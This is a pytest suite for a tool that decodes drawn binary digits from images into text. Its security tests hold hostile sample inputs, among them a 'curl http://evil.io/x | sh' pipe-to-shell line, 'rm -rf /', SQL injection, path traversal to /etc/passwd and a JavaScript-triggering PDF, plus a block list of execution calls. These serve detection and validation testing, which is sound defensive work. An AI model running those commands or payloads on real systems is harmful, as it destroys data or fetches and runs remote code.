"""
tests.py - DrawMeBinary test suite.

    pytest tests.py -v                    # everything
    pytest tests.py -v -m "not integration"   # unit tests only
    pytest tests.py -v -m integration     # synthetic + real-image pipeline
    python tests.py --smoke               # quick smoke test, no pytest

Integration tests generate synthetic artworks on the fly (they need a TTF
font on the system). Real-image tests run on any images found in test/.
"""
import os
import sys

import numpy as np
import pytest

from config import CONFIG, PRESETS, get_config_for_preset
from decoding import (LanguageValidator, decode_glyphs, group_lines,
                      tokens_in_line, _bits_to_text)
from extraction import classify_shape, cluster_streams, extract_glyphs
from pipeline import run_pipeline
from rendering import build_background

HERE = os.path.dirname(os.path.abspath(__file__))
TEST_DIR = os.path.join(os.path.dirname(HERE), 'test')


# --------------------------------------------------------------------------
# helpers
# --------------------------------------------------------------------------
def _find_font():
    from rendering import detect_fonts
    pref = [f for f in detect_fonts(CONFIG) if 'mono' in f.lower()]
    fonts = pref or detect_fonts(CONFIG)
    return fonts[0] if fonts else None


def make_glyph(bit, x, y, w=10, h=14, color=(0, 0, 0), kind='bin'):
    return {'bit': bit if kind == 'bin' else None, 'kind': kind,
            'char': bit, 'x': x, 'y': y, 'w': w, 'h': h,
            'cx': x + w / 2, 'cy': y + h / 2, 'color': color,
            'mask': np.ones((h, w), bool), 'conf': 0.9, 'stream': 0,
            'area': w * h, 'fill': 1.0}


def glyphs_from_string(bits, x0=10, y0=10, pitch=12, gap=18):
    """Lay out a bit string; spaces become token gaps."""
    out, x = [], x0
    for ch in bits:
        if ch == ' ':
            x += gap
            continue
        out.append(make_glyph(ch, x, y0))
        x += pitch
    return out


def draw_text_image(lines, font_size=30, fg='black', bg='white',
                    size=(900, 400), origin=(40, 40), leading=1.5):
    from PIL import Image, ImageDraw, ImageFont
    font = ImageFont.truetype(_find_font(), font_size)
    img = Image.new('RGB', size, bg)
    d = ImageDraw.Draw(img)
    y = origin[1]
    for line in lines:
        d.text((origin[0], y), line, font=font, fill=fg)
        y += int(font_size * leading)
    return img


def enc_bytes(text):
    # real UTF-8 bytes, so multi-byte characters (ñ, —, …) encode correctly
    return ' '.join(format(b, '08b') for b in text.encode('utf-8'))


def enc_nibble_rows(text):
    bins = [format(ord(c), '08b') for c in text]
    return (' '.join(b[:4] for b in bins), ' '.join(b[4:] for b in bins))


# --------------------------------------------------------------------------
# unit: decoding
# --------------------------------------------------------------------------
def test_bits_to_text_ascii():
    assert _bits_to_text('0100100001101001', CONFIG) == 'Hi'


def test_bits_to_text_latin1_fallback():
    # 0xF1 = ñ in latin-1, invalid alone in utf-8
    assert _bits_to_text('11110001', CONFIG) == 'ñ'


def test_tokens_split_on_gaps():
    g = glyphs_from_string('0100 0100')
    lines = group_lines(g, CONFIG)
    assert len(lines) == 1
    toks = tokens_in_line(lines[0], CONFIG)
    assert [t['bits'] for t in toks] == ['0100', '0100']


def test_decode_byte_tokens():
    g = glyphs_from_string(enc_bytes('Hi'))
    out = decode_glyphs(g, CONFIG, verbose=False)
    assert out['text'] == 'Hi'


def test_decode_utf8_multibyte():
    # accents, smart quote and em-dash must survive (UTF-8, not latin-1
    # mojibake like 'Ã±' for 'ñ')
    msg = 'añoejo —"o"'
    g = glyphs_from_string(enc_bytes(msg))
    out = decode_glyphs(g, CONFIG, verbose=False)
    assert out['text'] == msg


def test_decode_spanish_sentence():
    msg = 'dueño después niños'
    g = glyphs_from_string(enc_bytes(msg))
    out = decode_glyphs(g, CONFIG, verbose=False)
    assert out['text'] == msg


def test_decode_stacked_nibble_rows():
    top, bot = enc_nibble_rows('AI')
    g = glyphs_from_string(top, y0=10) + glyphs_from_string(bot, y0=40)
    out = decode_glyphs(g, CONFIG, verbose=False)
    assert out['text'] == 'AI'


def test_decode_vertical_nibble_column():
    g = []
    y = 10
    for c in 'ENOUGH':
        b = format(ord(c), '08b')
        g += glyphs_from_string(b[:4], x0=100, y0=y); y += 30
        g += glyphs_from_string(b[4:], x0=100, y0=y); y += 30
    out = decode_glyphs(g, CONFIG, verbose=False)
    assert out['text'] == 'ENOUGH'


def test_decode_damaged_token_skipped():
    # one token lost a bit; the rest of the line must still decode
    g = glyphs_from_string(enc_bytes('no') + ' 0110100')
    out = decode_glyphs(g, CONFIG, verbose=False)
    assert 'no' in out['text']


def test_color_streams_decode_separately():
    g1 = glyphs_from_string(enc_bytes('A'), y0=10)
    g2 = glyphs_from_string(enc_bytes('Y'), y0=10, x0=300)
    for x in g2:
        x['color'] = (200, 50, 50)
    glyphs = cluster_streams(g1 + g2, CONFIG)
    out = decode_glyphs(glyphs, CONFIG, verbose=False)
    texts = {s['text'] for s in out['streams']}
    assert texts == {'A', 'Y'}


def test_units_have_positions_for_poster():
    g = glyphs_from_string(enc_bytes('Hi'))
    out = decode_glyphs(g, CONFIG, verbose=False)
    units = out['streams'][0]['units']
    assert len(units) == 2
    assert all(len(u['bbox']) == 4 for u in units)


# --------------------------------------------------------------------------
# unit: shape classifier
# --------------------------------------------------------------------------
def _render_digit(ch, font_size=28):
    from PIL import Image, ImageDraw, ImageFont
    font = ImageFont.truetype(_find_font(), font_size)
    img = Image.new('L', (40, 50), 0)
    ImageDraw.Draw(img).text((5, 5), ch, font=font, fill=255)
    arr = np.array(img) > 128
    ys, xs = np.nonzero(arr)
    return arr[ys.min():ys.max() + 1, xs.min():xs.max() + 1]


@pytest.mark.skipif(_find_font() is None, reason='no TTF fonts found')
def test_classify_shape_zero_and_one():
    assert classify_shape(_render_digit('0'))[0] == '0'
    assert classify_shape(_render_digit('1'))[0] == '1'


# --------------------------------------------------------------------------
# unit: language validator / config
# --------------------------------------------------------------------------
def test_quality_prefers_words():
    v = LanguageValidator()
    assert v.quality('You shall not pass') > v.quality('Zx#\x07qq')


def test_quality_spanish():
    v = LanguageValidator()
    assert v.quality('el amor de mi vida') > 0.5


def test_presets():
    cfg = get_config_for_preset('dense')
    assert cfg['basic_max_font_pt'] < CONFIG['basic_max_font_pt']
    with pytest.raises(KeyError):
        get_config_for_preset('nope')
    assert set(PRESETS) == {'sparse', 'dense', 'bw', 'story'}


# --------------------------------------------------------------------------
# integration: synthetic artworks end-to-end
# --------------------------------------------------------------------------
needs_font = pytest.mark.skipif(_find_font() is None,
                                reason='no TTF fonts found')


def _run_on_pil(img):
    import tempfile
    with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as f:
        img.save(f.name)
        try:
            return run_pipeline(f.name, dict(CONFIG), verbose=False)
        finally:
            os.unlink(f.name)


@pytest.mark.integration
@needs_font
def test_pipeline_byte_lines():
    img = draw_text_image([enc_bytes('You sh'), enc_bytes('all no'),
                           enc_bytes('t pass')], font_size=20,
                          size=(1100, 300))
    out = _run_on_pil(img)
    assert out['text'].replace('\n', ' ') in ('You shall not pass',
                                              'You sh all no t pass')


@pytest.mark.integration
@needs_font
def test_pipeline_nibble_rows():
    top, bot = enc_nibble_rows('was here')
    img = draw_text_image([top, bot], font_size=28, size=(1000, 200))
    out = _run_on_pil(img)
    assert out['text'] == 'was here'


@pytest.mark.integration
@needs_font
def test_pipeline_inverse_colors():
    img = draw_text_image([enc_bytes('Hi')], font_size=26,
                          fg='white', bg=(180, 20, 20), size=(700, 150))
    out = _run_on_pil(img)
    assert out['text'] == 'Hi'


@pytest.mark.integration
@needs_font
def test_pipeline_background_rebuild():
    import cv2
    img = draw_text_image([enc_bytes('Hi')], font_size=26, size=(700, 150))
    out = _run_on_pil(img)
    arr = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
    bg = build_background(arr, out['all_bits'], CONFIG)
    assert (cv2.cvtColor(bg, cv2.COLOR_BGR2GRAY) < 128).sum() == 0


# --------------------------------------------------------------------------
# integration: real images in test/ (skipped when absent)
# --------------------------------------------------------------------------
def _real_images():
    if not os.path.isdir(TEST_DIR):
        return []
    return [os.path.join(TEST_DIR, f) for f in sorted(os.listdir(TEST_DIR))
            if f.lower().endswith(('.png', '.jpg', '.jpeg', '.bmp'))]


# Test fixtures live in test_fixtures.json at the project root - pure data
# about the test images, used ONLY by this test suite, never by the
# pipeline itself:
#   "expected"     exact decoded text per image
#   "experimental" images that only need to run without crashing
#   "min_quality"  language-quality floor for all other images
def _fixtures():
    import json
    path = os.path.join(os.path.dirname(HERE), 'test_fixtures.json')
    if not os.path.exists(path):
        return {'expected': {}, 'experimental': [], 'min_quality': 0.3}
    with open(path, encoding='utf-8') as f:
        d = json.load(f)
    d.setdefault('expected', {})
    d.setdefault('experimental', [])
    d.setdefault('min_quality', 0.3)
    return d


FIXTURES = _fixtures()


@pytest.mark.integration
@pytest.mark.parametrize('path', _real_images() or ['<none>'])
def test_real_images_decode_something(path):
    if path == '<none>':
        pytest.skip('no images in test/')
    out = run_pipeline(path, dict(CONFIG), verbose=False)
    if os.path.basename(path) in FIXTURES['experimental']:
        return                      # ran without crashing - good enough
    assert out['streams'], f'no streams decoded for {path}'
    v = LanguageValidator()
    assert v.quality(out['text']) >= FIXTURES['min_quality'], \
        f'low quality decode for {path}: {out["text"]!r}'


@pytest.mark.integration
@pytest.mark.parametrize('name', sorted(FIXTURES['expected']) or ['<none>'])
def test_real_images_exact(name):
    if name == '<none>':
        pytest.skip('no exact expectations defined')
    path = os.path.join(TEST_DIR, name)
    if not os.path.exists(path):
        pytest.skip(f'{name} not in test/')
    out = run_pipeline(path, dict(CONFIG), verbose=False)
    assert out['text'] == FIXTURES['expected'][name]


# --------------------------------------------------------------------------
# security
# --------------------------------------------------------------------------
import tempfile

from security import (SecurityError, detect_code, safe_basename,
                      safe_output_path, sanitize_text, scan_pdf_risks,
                      security_report, validate_input_file)


def _tmpfile(suffix, payload):
    f = tempfile.NamedTemporaryFile(suffix=suffix, delete=False)
    f.write(payload)
    f.close()
    return f.name


def _tiny_png(path=None):
    from PIL import Image as PImage
    path = path or tempfile.NamedTemporaryFile(suffix='.png',
                                               delete=False).name
    PImage.new('RGB', (40, 40), 'white').save(path)
    return path


def test_validate_rejects_executables_whatever_the_extension():
    for head in (b'MZ\x90\x00', b'\x7fELF\x02', b'#!/bin/sh\necho hi',
                 b'PK\x03\x04zipzip'):
        p = _tmpfile('.png', head + b'\x00' * 64)
        try:
            with pytest.raises(SecurityError):
                validate_input_file(p, CONFIG)
        finally:
            os.unlink(p)


def test_validate_rejects_disallowed_extension():
    p = _tmpfile('.py', b'print(1)')
    try:
        with pytest.raises(SecurityError):
            validate_input_file(p, CONFIG)
    finally:
        os.unlink(p)


def test_validate_rejects_content_spoofing():
    # plain text dressed up as a PNG
    p = _tmpfile('.png', b'just some text, not an image at all' * 4)
    try:
        with pytest.raises(SecurityError):
            validate_input_file(p, CONFIG)
    finally:
        os.unlink(p)


def test_validate_rejects_empty_and_oversized():
    p = _tmpfile('.png', b'')
    try:
        with pytest.raises(SecurityError):
            validate_input_file(p, CONFIG)
    finally:
        os.unlink(p)
    p = _tiny_png()
    try:
        with pytest.raises(SecurityError):
            validate_input_file(p, dict(CONFIG, max_input_mb=0))
    finally:
        os.unlink(p)


def test_validate_decompression_bomb_guard():
    p = _tiny_png()
    try:
        with pytest.raises(SecurityError):
            validate_input_file(p, dict(CONFIG, max_image_side=10))
        with pytest.raises(SecurityError):
            validate_input_file(p, dict(CONFIG, max_image_pixels=100))
    finally:
        os.unlink(p)


def test_validate_accepts_real_image():
    p = _tiny_png()
    try:
        report = validate_input_file(p, CONFIG)
        assert report['kind'] == 'image'
    finally:
        os.unlink(p)


def test_pdf_scan_reports_active_content():
    pdf = (b'%PDF-1.4\n1 0 obj\n<< /OpenAction << /S /JavaScript '
           b'/JS (app.alert(1)) >> >>\nendobj\n%%EOF')
    p = _tmpfile('.pdf', pdf)
    try:
        report = validate_input_file(p, CONFIG)
        assert report['kind'] == 'pdf'
        assert any('JavaScript' in w for w in report['warnings'])
        assert all('NOT be executed' in w for w in report['warnings'])
    finally:
        os.unlink(p)


def test_sanitize_text_neutralizes_terminal_attacks():
    evil = 'safe\x1b[2Jtext\x1b]0;owned\x07more\x00end'
    clean = sanitize_text(evil)
    assert '\x1b' not in clean and '\x00' not in clean
    assert 'safe' in clean and 'text' in clean and 'end' in clean
    # newlines and tabs survive
    assert sanitize_text('a\nb\tc') == 'a\nb\tc'


def test_detect_code_flags_scripts_and_injection():
    assert detect_code('#!/bin/bash\nrm -rf /')
    assert detect_code('curl http://evil.io/x | sh')
    assert detect_code("eval(input())")
    assert detect_code('<script>alert(1)</script>')
    assert detect_code("1; DROP TABLE users; --")
    assert detect_code('powershell -enc SQBFAFgA')
    assert detect_code('You shall not pass') == []
    assert detect_code('naama i love you') == []
    r = security_report('rm -rf /tmp/x')
    assert r['code_suspect'] and 'never' in r['note']


def test_safe_basename_blocks_traversal():
    assert safe_basename('../../etc/passwd') == 'passwd'
    assert safe_basename('..%2F..%2Fetc') != ''
    assert '/' not in safe_basename('a/b/c.png')
    b = safe_basename('\x00\x1b[2J.png')
    assert b and all(c.isalnum() or c in '._-' for c in b)
    assert safe_basename('...') == 'image'   # never empty, never a dotfile
    assert len(safe_basename('x' * 500)) <= 80


def test_safe_output_path_confined():
    out = tempfile.mkdtemp()
    assert safe_output_path(out, 'fine.png').startswith(
        os.path.realpath(out))
    with pytest.raises(SecurityError):
        safe_output_path(out, '../escape.png')


def test_pipeline_attaches_security_report():
    g = glyphs_from_string(enc_bytes('rm -rf /'))
    out = decode_glyphs(g, CONFIG, verbose=False)
    rep = security_report(out['text'])
    assert rep['code_suspect']


def test_no_dynamic_execution_in_source():
    """The project must never evaluate or execute anything: no eval/exec/
    compile, no os.system/popen/spawn/exec*, no subprocess, no pty, no
    importing by string. Decoded content stays data, always."""
    import ast
    banned_calls = {'eval', 'exec', 'compile', '__import__'}
    banned_attrs = {('os', 'system'), ('os', 'popen'), ('os', 'execv'),
                    ('os', 'execve'), ('os', 'spawnv'), ('os', 'spawnl'),
                    ('os', 'startfile')}
    banned_imports = {'subprocess', 'pty', 'ctypes', 'pickle', 'shelve',
                      'marshal'}
    offenders = []
    for fname in sorted(os.listdir(HERE)):
        if not fname.endswith('.py') or fname == 'tests.py':
            continue
        tree = ast.parse(open(os.path.join(HERE, fname),
                              encoding='utf-8').read())
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                f = node.func
                if isinstance(f, ast.Name) and f.id in banned_calls:
                    offenders.append(f'{fname}:{node.lineno} {f.id}()')
                if isinstance(f, ast.Attribute) and \
                        isinstance(f.value, ast.Name) and \
                        (f.value.id, f.attr) in banned_attrs:
                    offenders.append(
                        f'{fname}:{node.lineno} {f.value.id}.{f.attr}()')
            elif isinstance(node, (ast.Import, ast.ImportFrom)):
                names = [a.name for a in node.names] + \
                    ([node.module] if isinstance(node, ast.ImportFrom)
                     else [])
                for n in names:
                    if n and n.split('.')[0] in banned_imports:
                        offenders.append(f'{fname}:{node.lineno} import {n}')
    assert not offenders, f'dynamic execution found: {offenders}'


# --------------------------------------------------------------------------
# security logging (seclog / ECS)
# --------------------------------------------------------------------------
import json as _json

import seclog


def _seclog(**over):
    seclog.reset_logger()
    cfg = {'log_service_name': 'test-svc', 'log_service_version': '9.9.9',
           'log_environment': 'test', 'log_to_stdout': False,
           'log_to_file': False}
    cfg.update(over)
    return seclog.get_logger(cfg)


def test_seclog_emits_ecs_base_fields():
    lg = _seclog()
    seclog.new_correlation()
    rec = lg.event('decode.completed', category='file', outcome='success',
                   message='ok', source_ip='203.0.113.9')
    assert rec['@timestamp'] and rec['ecs']['version']
    assert rec['event']['action'] == 'decode.completed'
    assert rec['event']['category'] == ['file']
    assert rec['service']['name'] == 'test-svc'
    assert rec['trace']['id']                      # correlation present


def test_seclog_redacts_sensitive_and_decoded_content():
    lg = _seclog()
    rec = lg.event('decode.completed', category='file',
                   text='You shall not pass', password='hunter2',
                   authorization='Bearer x', content='secret payload')
    blob = _json.dumps(rec)
    for leaked in ('You shall not pass', 'hunter2', 'Bearer x',
                   'secret payload'):
        assert leaked not in blob


def test_seclog_ip_modes():
    assert seclog.process_ip('203.0.113.45', 'full') == '203.0.113.45'
    assert seclog.process_ip('203.0.113.45', 'truncate') == '203.0.113.0'
    assert seclog.process_ip('2001:db8::dead', 'truncate') == '2001:db8::'
    h = seclog.process_ip('203.0.113.45', 'hash', 'salt')
    assert h.startswith('sha256:') and '203.0.113' not in h
    assert seclog.process_ip(None, 'full') is None


def test_seclog_default_truncates_source_ip():
    lg = _seclog(log_ip_mode='truncate')
    rec = lg.event('request.received', category='web', source_ip='8.8.8.8')
    assert rec['source']['ip'] == '8.8.8.0'


def test_seclog_writes_one_json_line_per_event(tmp_path):
    lg = _seclog(log_to_file=True, log_dir=str(tmp_path))
    seclog.new_correlation()
    lg.event('app.started', category='process', outcome='success')
    lg.event('validation.refused', category='file', outcome='failure',
             level='warning', reason='bad signature')
    seclog.reset_logger()                          # flush/close handlers
    path = os.path.join(str(tmp_path), 'security.jsonl')
    lines = [l for l in open(path, encoding='utf-8') if l.strip()]
    assert len(lines) == 2
    recs = [_json.loads(l) for l in lines]          # each line is valid JSON
    assert [r['event']['action'] for r in recs] == \
        ['app.started', 'validation.refused']


def test_seclog_hash_helpers_are_stable():
    assert seclog.hash_text('abc') == seclog.hash_text('abc')
    assert seclog.hash_text('abc').startswith('sha256:')
    assert seclog.hash_bytes(b'abc') == seclog.hash_text('abc')


# --------------------------------------------------------------------------
# smoke runner
# --------------------------------------------------------------------------
if __name__ == '__main__':
    if '--smoke' in sys.argv:
        g = glyphs_from_string(enc_bytes('Hi'))
        out = decode_glyphs(g, CONFIG, verbose=False)
        ok = out['text'] == 'Hi'
        print('smoke decode:', out['text'], 'OK' if ok else 'FAIL')
        sys.exit(0 if ok else 1)
    sys.exit(pytest.main([__file__, '-v'] + sys.argv[1:]))
